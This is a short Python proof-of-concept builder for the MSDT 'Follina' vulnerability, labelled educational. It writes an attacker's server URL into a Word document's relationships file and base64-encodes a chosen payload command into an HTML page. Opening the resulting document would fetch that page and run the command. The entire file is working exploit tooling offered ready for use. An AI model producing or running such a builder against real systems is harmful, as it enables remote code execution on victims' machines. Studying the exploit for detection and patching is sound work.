### POC for MSDT-Follina ###
### Admkali ###
### For educational purpose only ###

import os
import fileinput
import time
import base64


documents_path = os.path.join(
    "doc", "word", "_rels", "document.xml.rels")
IPSERVER = input('''
Machine Ip Address (http://YourServer:<Port>/<PayloadSite>.html\n
''')
with open(documents_path) as flipme:
    AttackerHost = flipme.read()
    AttackerHost = AttackerHost.replace("{YourServerHere}",f"{IPSERVER}")
with open(documents_path, "w") as filpme:
    filpme.write(AttackerHost)
time.sleep(2)

sitehtml = os.path.join("www", "index.html")
command = input("Payload: ")
base64_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
with open(sitehtml) as payload:
    target = payload.read()
    target = target.replace("{PayloadInsideHere}",f"{base64_command}")
with open(sitehtml, "w") as payload:
    payload.write(target)

